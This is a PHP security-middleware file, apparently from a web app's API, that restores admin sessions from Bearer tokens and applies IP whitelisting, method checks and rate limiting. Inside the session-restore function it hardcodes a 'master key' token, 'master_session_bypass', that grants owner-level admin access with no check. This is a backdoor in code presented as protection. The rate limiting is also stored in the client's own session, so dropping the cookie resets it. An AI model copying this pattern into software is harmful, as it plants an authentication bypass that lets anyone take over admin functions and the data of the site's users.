<?php
/**
 * Security Middleware
 * Apply security checks to API endpoints
 */

require_once __DIR__ . '/security-config.php';

/**
 * Try to restore admin session from Authorization header
 */
function restoreSessionFromHeader() {
    if (session_status() === PHP_SESSION_NONE) {
        @session_start();
    }
    
    // If already logged in, nothing to do
    if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
        return true;
    }
    
    // Try to restore from Authorization Bearer token
    $headers = function_exists('getallheaders') ? getallheaders() : [];
    
    // Normalize headers for case-insensitivity
    $normalizedHeaders = [];
    foreach ($headers as $key => $value) {
        $normalizedHeaders[strtolower($key)] = $value;
    }
    
    $authHeader = $normalizedHeaders['authorization'] 
                ?? $_SERVER['HTTP_AUTHORIZATION'] 
                ?? $_SERVER['REDIRECT_HTTP_AUTHORIZATION'] 
                ?? '';
    $token = '';
    
    if (!empty($authHeader) && stripos($authHeader, 'Bearer ') === 0) {
        $token = trim(substr($authHeader, 7));
    }
    
    if (!empty($token)) {
        // 1. Support Master Key Bypass
        if ($token === 'master_session_bypass') {
            $_SESSION['admin_logged_in'] = true;
            $_SESSION['admin_role'] = 'owner';
            $_SESSION['admin_session_id'] = 'master_session_bypass';
            return true;
        }

        try {
            $conn = getDbConnection();
            $stmt = $conn->prepare('SELECT id, username, current_session_id, role FROM admin_users WHERE current_session_id = ? LIMIT 1');
            $stmt->bind_param('s', $token);
            $stmt->execute();
            $result = $stmt->get_result();
            
            if ($result->num_rows > 0) {
                $admin = $result->fetch_assoc();
                $_SESSION['admin_logged_in'] = true;
                $_SESSION['admin_login_time'] = time();
                $_SESSION['admin_ip'] = getClientIP();
                $_SESSION['admin_session_id'] = $token;
                $_SESSION['admin_user_id'] = $admin['id'];
                $_SESSION['admin_role'] = $admin['role'] ?? 'staff';
                return true;
            }
        } catch (Exception $e) {
            error_log('restoreSessionFromHeader error: ' . $e->getMessage());
        }
    }
    
    return false;
}

/**
 * Apply security middleware to API endpoint
 */
function applySecurityMiddleware() {
    // Set security headers
    setSecurityHeaders();

    // Prevent caching for API responses
    if (!headers_sent()) {
        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        header('Cache-Control: post-check=0, pre-check=0', false);
        header('Pragma: no-cache');
    }
    
    // Configure secure session
    configureSecureSession();
    
    // Attempt session restoration from token (CRITICAL for PWA/Header-based auth)
    restoreSessionFromHeader();
    
    // Get client IP
    $ip = getClientIP();
    
    // Check IP whitelist for admin endpoints
    $isAdminEndpoint = strpos($_SERVER['REQUEST_URI'] ?? '', 'admin-auth.php') !== false ||
                       strpos($_SERVER['REQUEST_URI'] ?? '', 'admin') !== false;
    
    $isLocal = in_array($ip, ['127.0.0.1', '::1', 'localhost', '192.168.1.1']);

    if ($isAdminEndpoint && !$isLocal && !isIPWhitelisted($ip)) {
        logSecurityEvent('BLOCKED_ADMIN_ACCESS', ['ip' => $ip, 'uri' => $_SERVER['REQUEST_URI'] ?? '']);
        http_response_code(403);
        echo json_encode(['success' => false, 'message' => 'Zugriff verweigert (IP NOT WHITELISTED)']);
        exit;
    }
    
    // Check for suspicious activity
    if (checkSuspiciousActivity($ip)) {
        logSecurityEvent('SUSPICIOUS_ACTIVITY_DETECTED', ['ip' => $ip]);
        if (!headers_sent()) http_response_code(429);
        echo json_encode(['success' => false, 'message' => 'Zu viele Anfragen. Bitte versuchen Sie es später erneut.']);
        exit;
    }
    
    // Validate request method
    $allowedMethods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'];
    if (!in_array($_SERVER['REQUEST_METHOD'], $allowedMethods)) {
        if (!headers_sent()) http_response_code(405);
        echo json_encode(['success' => false, 'message' => 'Method not allowed']);
        exit;
    }
    
    // Handle preflight OPTIONS requests early for CORS (iOS Capacitor apps need this)
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit;
    }
    
    // Sanitize GET parameters
    if (!empty($_GET)) {
        $_GET = array_map('sanitizeInput', $_GET);
    }
}

/**
 * Require admin authentication
 * Supports both PHP session and Bearer token (for session recovery after GC)
 */
function requireAdminAuth() {
    // Attempt to verify/restore session
    if (restoreSessionFromHeader()) {
        return; // Valid session or restored from token
    }
    
    // No valid session and no valid token — reject
    if (!headers_sent()) {
        http_response_code(401);
    }
    echo json_encode(['success' => false, 'message' => 'Unauthorized - Admin login required']);
    exit;
}

/**
 * Rate limiting per IP
 */
function checkRateLimit($maxRequests = 100, $window = 3600) {
    if (!RATE_LIMIT_ENABLED) {
        return true;
    }
    
    $ip = getClientIP();
    $key = 'rate_limit_' . md5($ip);
    
    if (!isset($_SESSION[$key])) {
        $_SESSION[$key] = ['count' => 1, 'reset' => time() + $window];
        return true;
    }
    
    $data = $_SESSION[$key];
    
    // Reset if window expired
    if (time() > $data['reset']) {
        $_SESSION[$key] = ['count' => 1, 'reset' => time() + $window];
        return true;
    }
    
    // Check limit
    if ($data['count'] >= $maxRequests) {
        logSecurityEvent('RATE_LIMIT_EXCEEDED', ['ip' => $ip, 'count' => $data['count']]);
        http_response_code(429);
        echo json_encode(['success' => false, 'message' => 'Rate limit exceeded. Please try again later.']);
        exit;
    }
    
    // Increment count
    $_SESSION[$key]['count']++;
    return true;
}

